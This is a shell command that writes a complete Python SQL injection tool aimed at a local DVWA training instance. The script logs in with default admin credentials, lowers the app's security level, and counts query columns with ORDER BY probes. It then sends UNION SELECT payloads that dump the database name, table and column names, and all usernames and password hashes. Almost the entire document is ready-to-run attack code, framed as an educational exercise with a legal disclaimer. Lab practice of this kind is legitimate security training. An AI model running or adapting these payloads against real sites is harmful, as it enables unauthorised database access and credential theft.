cat > sql_injection_exploit.py << 'ENDOFFILE'
#!/usr/bin/env python3
"""
SQL Injection Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of SQL injection vulnerability
"""

import requests
from bs4 import BeautifulSoup
import sys
import time

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = ""

TARGET_URL = "http://localhost/vulnerabilities/sqli/"
LOGIN_URL = "http://localhost/login.php"
SETUP_URL = "http://localhost/setup.php"
SECURITY_URL = "http://localhost/security.php"

def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    SQL Injection Exploitation Tool - DVWA
    Educational Purpose Only - Use Responsibly
{'='*70}{Style.RESET_ALL}
    """
    print(banner)

def get_authenticated_session():
    """Login to DVWA and return authenticated session"""
    print(f"{Fore.YELLOW}[*] Attempting to login to DVWA...{Style.RESET_ALL}")
    
    session = requests.Session()
    
    try:
        # First, try to access the setup page to initialize
        print(f"{Fore.YELLOW}[*] Checking DVWA setup...{Style.RESET_ALL}")
        setup_response = session.get(SETUP_URL)
        
        if "Create / Reset Database" in setup_response.text:
            print(f"{Fore.YELLOW}[!] Database needs to be created{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Please run 'Setup/Reset DB' in browser first{Style.RESET_ALL}")
            
        # Get the login page to establish session
        response = session.get(LOGIN_URL)
        print(f"{Fore.CYAN}[DEBUG] Login page status: {response.status_code}{Style.RESET_ALL}")
        
        # Extract any CSRF token if present
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'user_token'})
        
        # Prepare login data
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        
        # Add CSRF token if it exists
        if csrf_token:
            login_data['user_token'] = csrf_token.get('value')
            print(f"{Fore.CYAN}[DEBUG] CSRF token found{Style.RESET_ALL}")
        
        # Perform login
        response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        print(f"{Fore.CYAN}[DEBUG] After login status: {response.status_code}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[DEBUG] Final URL: {response.url}{Style.RESET_ALL}")
        
        # Check if we're still on login page
        if "login.php" in response.url or "Login" in response.text:
            print(f"{Fore.RED}[!] Login may have failed{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Continuing anyway - some DVWA versions redirect differently{Style.RESET_ALL}")
        
        # Set security level to low
        print(f"{Fore.YELLOW}[*] Setting security level to low...{Style.RESET_ALL}")
        session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
        
        # Test if we can access the SQL injection page
        test_response = session.get(TARGET_URL)
        if test_response.status_code == 200 and "SQL Injection" in test_response.text:
            print(f"{Fore.GREEN}[+] Successfully authenticated!{Style.RESET_ALL}")
            return session
        else:
            print(f"{Fore.RED}[!] Could not access SQL injection page{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Please make sure database is set up in browser{Style.RESET_ALL}")
            return None
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error during login: {e}{Style.RESET_ALL}")
        return None

def test_vulnerability(session):
    """Test if SQL injection vulnerability exists"""
    print(f"\n{Fore.YELLOW}[*] Testing for SQL injection vulnerability...{Style.RESET_ALL}")
    
    # Test with single quote
    payload = "1'"
    params = {'id': payload, 'Submit': 'Submit'}
    
    try:
        response = session.get(TARGET_URL, params=params)
        
        if "error in your sql syntax" in response.text.lower() or "mysql" in response.text.lower():
            print(f"{Fore.GREEN}[+] SQL Injection vulnerability CONFIRMED!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}    Single quote caused SQL syntax error{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[-] No obvious SQL error detected{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Continuing anyway - vulnerability may still exist{Style.RESET_ALL}")
            return True  # Continue anyway as DVWA Low should be vulnerable
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error during testing: {e}{Style.RESET_ALL}")
        return False

def extract_data(session, payload, description):
    """Execute SQL injection payload and extract results"""
    print(f"\n{Fore.CYAN}[*] {description}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}    Payload: {payload}{Style.RESET_ALL}")
    
    params = {'id': payload, 'Submit': 'Submit'}
    
    try:
        response = session.get(TARGET_URL, params=params)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find all result blocks in DVWA
        results = soup.find_all('pre')
        
        found_results = False
        if results:
            for result in results:
                text = result.get_text().strip()
                if text and ("First name:" in text or "Surname:" in text or "ID:" in text):
                    found_results = True
                    lines = [line.strip() for line in text.split('\n') if line.strip()]
                    if not lines:
                        continue
                    print(f"{Fore.GREEN}[+] Results extracted:{Style.RESET_ALL}")
                    for line in lines:
                        print(f"{Fore.WHITE}    {line}{Style.RESET_ALL}")
                    print()  # Blank line between results
        
        if not found_results:
            print(f"{Fore.YELLOW}[-] No formatted results found{Style.RESET_ALL}")
            return False
            
        return True
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error during extraction: {e}{Style.RESET_ALL}")
        return False

def enumerate_columns(session):
    """Determine number of columns in query"""
    print(f"\n{Fore.CYAN}[*] Enumerating number of columns...{Style.RESET_ALL}")
    
    for i in range(1, 10):
        payload = f"1' ORDER BY {i}#"
        params = {'id': payload, 'Submit': 'Submit'}
        
        try:
            response = session.get(TARGET_URL, params=params)
            
            if "unknown column" in response.text.lower():
                columns = i - 1
                print(f"{Fore.GREEN}[+] Query returns {columns} columns{Style.RESET_ALL}")
                return columns
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return None
    
    # If we got here, assume 2 columns (DVWA default)
    print(f"{Fore.YELLOW}[*] Assuming 2 columns (DVWA default){Style.RESET_ALL}")
    return 2

def full_exploitation(session):
    """Perform complete SQL injection exploitation"""
    
    # Step 1: Enumerate columns
    columns = enumerate_columns(session)
    if not columns:
        print(f"{Fore.RED}[!] Could not determine column count{Style.RESET_ALL}")
        return
    
    # Step 2: Extract database name
    extract_data(session, 
                "1' UNION SELECT null, database()#",
                "Extracting database name")
    
    # Step 3: Extract table names
    extract_data(session,
                "1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#",
                "Extracting table names")
    
    # Step 4: Extract column names from users table
    extract_data(session,
                "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#",
                "Extracting column names from 'users' table")
    
    # Step 5: Extract credentials (THE BIG ONE!)
    print(f"\n{Fore.MAGENTA}{'='*70}")
    print(f"[!!!] EXTRACTING USERNAMES AND PASSWORDS [!!!]")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    extract_data(session,
                "1' UNION SELECT user, password FROM users#",
                "Extracting all credentials from database")
    
    print(f"\n{Fore.MAGENTA}{'='*70}")
    print(f"[!!!] EXPLOITATION COMPLETE [!!!]")
    print(f"{'='*70}{Style.RESET_ALL}")

def main():
    """Main execution function"""
    print_banner()
    
    # Get authenticated session
    session = get_authenticated_session()
    if not session:
        print(f"\n{Fore.RED}[!] Failed to authenticate{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Please ensure:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    1. DVWA is running (docker ps){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    2. Database is set up (Setup/Reset DB in browser){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    3. Security level is 'low' in browser{Style.RESET_ALL}")
        sys.exit(1)
    
    # Test for vulnerability
    if not test_vulnerability(session):
        print(f"{Fore.YELLOW}[!] Continuing with exploitation anyway...{Style.RESET_ALL}")
    
    # Perform full exploitation
    full_exploitation(session)
    
    # Disclaimer
    print(f"\n{Fore.RED}{'='*70}")
    print(f"[!] REMINDER: This tool is for educational purposes only")
    print(f"[!] Only use on systems you own or have explicit permission to test")
    print(f"[!] Unauthorized access to computer systems is illegal")
    print(f"{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
ENDOFFILE